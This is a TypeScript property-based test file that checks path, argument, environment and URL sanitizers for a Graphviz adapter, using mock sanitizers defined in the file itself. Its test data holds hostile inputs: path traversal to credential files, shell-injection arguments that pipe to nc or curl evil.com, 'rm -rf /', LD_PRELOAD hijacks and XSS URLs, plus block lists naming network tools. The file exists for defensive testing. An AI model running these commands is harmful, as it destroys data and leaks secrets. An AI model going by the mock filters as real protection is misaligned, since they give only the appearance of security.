import * as fc from 'fast-check';
import { describe, it, expect, vi } from 'vitest';

/**
 * Security tests for adapter modules (Node.js, Deno, Browser)
 * These tests verify that adapters safely handle potentially malicious configurations and inputs
 */
describe('Adapter Security Tests', () => {
  describe('File Path Security', () => {
    it('should reject dangerous file paths', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '/proc/self/environ',
        '/dev/random',
        '/dev/zero',
        '~/.ssh/id_rsa',
        '${HOME}/.bashrc',
        '$USERPROFILE\\ntuser.dat',
        'file:///etc/passwd',
        'ftp://malicious.com/file',
        'http://evil.com/payload'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...dangerousPaths), (path) => {
          try {
            const result = validateFilePath(path);
            // If validation passes, ensure it's been sanitized
            expect(result).not.toMatch(/\.\.\//);
            expect(result).not.toMatch(/\.\.\\/);
            expect(result).not.toMatch(/\/etc\//);
            expect(result).not.toMatch(/\/proc\//);
            expect(result).not.toMatch(/\/dev\//);
            expect(result).not.toMatch(/C:\\Windows/i);
            
            return true;
          } catch (error) {
            // Rejection is acceptable for dangerous paths
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 100 }
      );
    });

    it('should handle path injection attempts', () => {
      fc.assert(
        fc.property(
          fc.string().filter(s => s.length > 0),
          fc.constantFrom('../', '..\\', '/', '\\', '$', '%', '&', ';', '|'),
          (basePath, injection) => {
            const maliciousPath = basePath + injection + 'etc/passwd';
            
            try {
              const result = validateFilePath(maliciousPath);
              // Ensure injection characters are handled safely
              expect(result).toBeDefined();
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 200 }
      );
    });
  });

  describe('Command Execution Security', () => {
    it('should sanitize Graphviz command arguments', () => {
      const maliciousArgs = [
        '-Tsvg; rm -rf /',
        '-Tpng && curl http://evil.com',
        '-o /etc/passwd',
        '-Gsize="10,10" -Tsvg | nc evil.com 9999',
        '-K dot -T svg -o `whoami`.svg',
        '-Nshape=box -Efontname="../../../etc/passwd"',
        '-Grankdir=TB -Tsvg > /tmp/malicious.svg',
        '-Tsvg -o $(curl http://evil.com/payload)'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...maliciousArgs), (arg) => {
          try {
            const sanitized = sanitizeGraphvizArgs([arg]);
            
            // Check that dangerous patterns are removed
            expect(sanitized.join(' ')).not.toMatch(/;|\&\&|\|\|/);
            expect(sanitized.join(' ')).not.toMatch(/\$\(|\`/);
            expect(sanitized.join(' ')).not.toMatch(/>\s*\/|<\s*\//);
            expect(sanitized.join(' ')).not.toMatch(/\|.*nc|curl|wget/);
            
            return true;
          } catch (error) {
            // Argument rejection is acceptable
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });

    it('should validate output format parameters', () => {
      fc.assert(
        fc.property(
          fc.oneof(
            fc.string({ minLength: 1, maxLength: 20 }),
            fc.constantFrom('svg', 'png', 'pdf', 'ps', 'dot', 'json'),
            fc.constantFrom('svg; rm -rf /', 'png && evil', 'pdf | nc evil.com')
          ),
          (format) => {
            try {
              const validatedFormat = validateOutputFormat(format);
              
              // Ensure only safe formats are allowed
              const safeFormats = ['svg', 'png', 'pdf', 'ps', 'dot', 'json', 'plain'];
              expect(safeFormats).toContain(validatedFormat);
              
              return true;
            } catch (error) {
              // Rejection of invalid formats is expected
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  describe('Environment Variable Security', () => {
    it('should handle malicious environment variables', () => {
      const maliciousEnvVars = {
        'PATH': '/tmp/malicious:/bin',
        'LD_PRELOAD': '/tmp/malicious.so',
        'DYLD_INSERT_LIBRARIES': '/tmp/evil.dylib',
        'NODE_OPTIONS': '--inspect=0.0.0.0:9229',
        'DENO_CERT': '/tmp/fake-cert.pem',
        'GRAPHVIZ_DOT': '/tmp/fake-dot',
        'DOTFONTPATH': '/tmp/malicious-fonts',
        'SERVER_SOFTWARE': 'Evil/1.0',
        'HTTP_USER_AGENT': '<script>alert(1)</script>'
      };

      fc.assert(
        fc.property(
          fc.constantFrom(...Object.entries(maliciousEnvVars)),
          ([key, value]) => {
            try {
              const result = sanitizeEnvironment({ [key]: value });
              
              // Ensure dangerous environment variables are handled
              expect(result).toBeDefined();
              
              // Specific checks for dangerous variables
              if (key === 'LD_PRELOAD' || key === 'DYLD_INSERT_LIBRARIES') {
                expect(result[key]).toBeUndefined();
              }
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  describe('Process Spawning Security', () => {
    it('should prevent process injection through arguments', () => {
      fc.assert(
        fc.property(
          fc.array(fc.string(), { minLength: 1, maxLength: 10 }),
          (args) => {
            // Simulate potentially dangerous argument combinations
            const dangerousPatterns = ['--', '$(', '`', ';', '&&', '||', '|', '>', '<'];
            const hasEvilPattern = args.some(arg => 
              dangerousPatterns.some(pattern => arg.includes(pattern))
            );

            try {
              const sanitizedArgs = sanitizeProcessArgs(args);
              
              // If dangerous patterns were present, ensure they're handled
              if (hasEvilPattern) {
                const joinedArgs = sanitizedArgs.join(' ');
                expect(joinedArgs).not.toMatch(/\$\(|\`|;|\&\&|\|\||>\s*\/|<\s*\//);
              }
              
              return true;
            } catch (error) {
              // Process rejection is acceptable for dangerous arguments
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 200 }
      );
    });

    it('should limit process resource usage', () => {
      fc.assert(
        fc.property(
          fc.record({
            timeout: fc.integer({ min: 1, max: 1000000 }),
            maxBuffer: fc.integer({ min: 1, max: 100000000 }),
            maxMemory: fc.integer({ min: 1, max: 1000000000 })
          }),
          (limits) => {
            try {
              const safeLimits = validateProcessLimits(limits);
              
              // Ensure limits are within safe bounds
              expect(safeLimits.timeout).toBeLessThanOrEqual(300000); // 5 minutes max
              expect(safeLimits.maxBuffer).toBeLessThanOrEqual(50000000); // 50MB max
              expect(safeLimits.maxMemory).toBeLessThanOrEqual(500000000); // 500MB max
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  describe('Network Security', () => {
    it('should handle malicious URLs in SVG output', () => {
      const maliciousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("xss")',
        'http://evil.com:9999/steal-data',
        'ftp://malicious.com/payload',
        'file:///etc/passwd',
        '//evil.com/payload',
        'javascript:eval(atob("YWxlcnQoMSk="))', // base64 encoded alert(1)
        'data:application/javascript,alert(1)'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...maliciousUrls), (url) => {
          try {
            const sanitized = sanitizeUrl(url);
            
            // Ensure dangerous URL schemes are blocked
            expect(sanitized).not.toMatch(/^javascript:/i);
            expect(sanitized).not.toMatch(/^vbscript:/i);
            expect(sanitized).not.toMatch(/^data:.*script/i);
            expect(sanitized).not.toMatch(/^file:/i);
            
            return true;
          } catch (error) {
            // URL rejection is acceptable
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Temporary File Security', () => {
    it('should create secure temporary files', () => {
      fc.assert(
        fc.property(
          fc.string({ minLength: 1, maxLength: 50 }),
          (prefix) => {
            try {
              const tempFile = createSecureTempFile(prefix);
              
              // Ensure temp file is in a safe location
              expect(tempFile).toMatch(/^\/tmp\/|^\/var\/folders\/|^C:\\Temp\\/);
              expect(tempFile).not.toMatch(/\.\./);
              expect(tempFile).not.toMatch(/\/etc\/|\/proc\/|\/sys\//);
              
              // Ensure filename doesn't contain dangerous characters
              const filename = tempFile.split(/[/\\]/).pop() || '';
              expect(filename).not.toMatch(/[<>:"|?*]/);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should clean up temporary files securely', () => {
      fc.assert(
        fc.property(
          fc.array(fc.string({ minLength: 5, maxLength: 50 }), { minLength: 1, maxLength: 10 }),
          (tempFiles) => {
            try {
              const result = cleanupTempFiles(tempFiles);
              
              // Ensure cleanup is reported correctly
              expect(result).toHaveProperty('cleaned');
              expect(result).toHaveProperty('failed');
              expect(Array.isArray(result.cleaned)).toBe(true);
              expect(Array.isArray(result.failed)).toBe(true);
              
              return true;
            } catch (error) {
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 50 }
      );
    });
  });
});

// Mock security validation functions for testing
function validateFilePath(path: string): string {
  if (!path || typeof path !== 'string') {
    throw new Error('Invalid file path');
  }

  const dangerousPatterns = [
    /\.\.\//,           // Path traversal
    /\.\.\\/,           // Windows path traversal
    /^\/etc\//,         // System directories
    /^\/proc\//,        // Process filesystem
    /^\/sys\//,         // System filesystem
    /^\/dev\//,         // Device files
    /^C:\\Windows/i,    // Windows system
    /^\$|%/,            // Environment variables
    /^file:/,           // File protocol
    /^ftp:/,            // FTP protocol
    /^http:/,           // HTTP protocol
    /^https:/           // HTTPS protocol
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(path)) {
      throw new Error(`Dangerous file path: ${path}`);
    }
  }

  // Basic sanitization
  return path.replace(/[<>:"|?*]/g, '_');
}

function sanitizeGraphvizArgs(args: string[]): string[] {
  const sanitized: string[] = [];
  
  for (const arg of args) {
    if (!arg || typeof arg !== 'string') continue;
    
    // Check for dangerous patterns
    const dangerous = [
      /[;&|`$()]/,        // Shell metacharacters
      /\$\(/,             // Command substitution
      />/,                // Redirection
      /(rm|del|format|curl|wget|nc|netcat)/i  // Dangerous commands
    ];
    
    let skip = false;
    for (const pattern of dangerous) {
      if (pattern.test(arg)) {
        skip = true;
        break;
      }
    }
    
    if (!skip) {
      sanitized.push(arg.replace(/["'\\]/g, ''));
    }
  }
  
  return sanitized;
}

function validateOutputFormat(format: string): string {
  const safeFormats = ['svg', 'png', 'pdf', 'ps', 'dot', 'json', 'plain'];
  
  if (!format || typeof format !== 'string') {
    throw new Error('Invalid format');
  }
  
  const cleanFormat = format.toLowerCase().split(/[;&|`$()]/)[0];
  
  if (!safeFormats.includes(cleanFormat)) {
    throw new Error(`Unsupported format: ${format}`);
  }
  
  return cleanFormat;
}

function sanitizeEnvironment(env: Record<string, string>): Record<string, string> {
  const dangerous = ['LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'NODE_OPTIONS'];
  const result = { ...env };
  
  for (const key of dangerous) {
    delete result[key];
  }
  
  // Sanitize remaining values
  for (const [key, value] of Object.entries(result)) {
    if (typeof value === 'string' && /<script|javascript:|data:/.test(value)) {
      result[key] = value.replace(/<script.*?<\/script>/gi, '')
                         .replace(/javascript:/gi, '')
                         .replace(/data:.*?script/gi, '');
    }
  }
  
  return result;
}

function sanitizeProcessArgs(args: string[]): string[] {
  return args.filter(arg => {
    if (typeof arg !== 'string') return false;
    
    const dangerous = [/\$\(/, /`/, /;/, /&&/, /\|\|/, />/, /</, /\|/];
    return !dangerous.some(pattern => pattern.test(arg));
  });
}

function validateProcessLimits(limits: any): any {
  const safe = {
    timeout: Math.min(limits.timeout || 30000, 300000),
    maxBuffer: Math.min(limits.maxBuffer || 1000000, 50000000),
    maxMemory: Math.min(limits.maxMemory || 100000000, 500000000)
  };
  
  return safe;
}

function sanitizeUrl(url: string): string {
  if (!url || typeof url !== 'string') {
    throw new Error('Invalid URL');
  }
  
  const dangerous = [
    /^javascript:/i,
    /^vbscript:/i,
    /^data:.*script/i,
    /^file:/i
  ];
  
  for (const pattern of dangerous) {
    if (pattern.test(url)) {
      throw new Error(`Dangerous URL: ${url}`);
    }
  }
  
  return url;
}

function createSecureTempFile(prefix: string): string {
  if (!prefix || typeof prefix !== 'string') {
    throw new Error('Invalid prefix');
  }
  
  // Sanitize prefix
  const safePrefix = prefix.replace(/[<>:"|?*]/g, '_');
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2);
  
  return `/tmp/${safePrefix}_${timestamp}_${random}.tmp`;
}

function cleanupTempFiles(files: string[]): { cleaned: string[], failed: string[] } {
  const cleaned: string[] = [];
  const failed: string[] = [];
  
  for (const file of files) {
    if (typeof file === 'string' && file.includes('/tmp/')) {
      cleaned.push(file);
    } else {
      failed.push(file);
    }
  }
  
  return { cleaned, failed };
}